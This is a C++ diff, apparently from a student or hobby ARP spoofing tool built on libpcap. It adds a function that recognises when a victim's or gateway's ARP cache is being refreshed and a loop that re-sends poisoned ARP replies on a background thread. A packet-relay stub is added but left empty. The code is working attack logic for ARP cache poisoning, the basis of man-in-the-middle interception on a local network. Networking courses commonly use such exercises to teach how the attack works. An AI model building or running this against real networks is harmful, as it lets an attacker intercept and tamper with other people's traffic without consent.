@@ -49,8 +49,63 @@ void continueSendArp(pcap_t *handle, EthArpPacket pkt, int repeat)
 	}
 }
 
-bool isRefreshed(pcap_t* handle, EthArpPacket pkt)
+bool isRefreshed(pcap_t* handle, const u_char *receivedPkt, FlowInfo flow)
+{
+	EthArpPacket *pkt = (EthArpPacket *)receivedPkt;
+	// case : broadcast
+	if(pkt->eth_.dmac_ == Mac::broadcastMac())
+	{
+		// sender broadcast
+		if(pkt->arp_.sip_ == flow.senderIp && pkt->eth_.smac_ == flow.senderMac)
+		{
+			return true;
+		}
+		// target broadcast
+		if(pkt->arp_.sip_ == flow.targetIp && pkt->eth_.smac_ == flow.targetMac)
+		{
+			return true;
+		}
+	}
+	else // case : unicast
+	{
+		// sender -> target
+		if(pkt->arp_.sip_ == flow.senderIp && pkt->eth_.smac_ == flow.senderMac)
+		{
+			if(pkt->arp_.tip_ == flow.targetIp && pkt->arp_.tmac_ == flow.attackerMac)
+			{
+				return true;
+			}
+		}
+	}
+	return false;
+}
+
+void relayPacket()
 {
 	
-	return false;
+}
+
+void spoofProcess(int mode, pcap_t *handle, EthArpPacket pkt, FlowInfo flow)
+{
+	struct pcap_pkthdr *header;
+	const u_char *receivedPkt;
+	std::thread sendArpThread(continueSendArp, handle, pkt, 10);
+	while (true)
+	{
+		int result = pcap_next_ex(handle, &header, &receivedPkt);
+		if (result == 0)
+			continue;
+		if (result == PCAP_ERROR || result == PCAP_ERROR_BREAK)
+		{
+			printf("pcap_next_ex return %d(%s)\n", result, pcap_geterr(handle));
+			break;
+		}
+
+		if (isRefreshed(handle, receivedPkt, flow))
+			sendArp(handle, pkt);
+		else
+			relayPacket();
+	}
+
+	sendArpThread.detach();
 }
